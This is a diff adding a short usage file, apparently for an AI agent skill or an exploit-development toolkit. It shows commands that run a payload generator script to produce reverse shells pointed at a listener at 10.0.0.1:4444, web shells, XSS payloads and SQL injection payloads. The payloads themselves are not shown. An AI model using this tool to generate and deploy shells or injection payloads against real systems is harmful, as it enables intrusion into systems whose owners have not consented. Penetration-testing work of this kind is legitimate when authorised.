@@ -1,0 +1,45 @@
+---
+name: example-usage
+description: bash python scripts/payloadgenerator.py -t reverseshell --lhost 10.0.0.1 --lport 4444 --os linux
+category: web
+---
+
+# Exploit Development — Example Usage
+
+## Payload Generation
+
+### Reverse Shell (All Languages)
+
+```bash
+python scripts/payload_generator.py -t reverse_shell --lhost 10.0.0.1 --lport 4444 --os linux
+```
+
+### Specific Language
+
+```bash
+python scripts/payload_generator.py -t reverse_shell --lhost 10.0.0.1 --lport 4444 --language python
+```
+
+### Web Shells
+
+```bash
+python scripts/payload_generator.py -t web_shell -o webshells.json
+```
+
+### XSS Payloads
+
+```bash
+python scripts/payload_generator.py -t xss -o xss_payloads.json
+```
+
+### SQL Injection Payloads
+
+```bash
+python scripts/payload_generator.py -t sqli -o sqli_payloads.json
+```
+
+### List All Payload Types
+
+```bash
+python scripts/payload_generator.py --list-types
+```
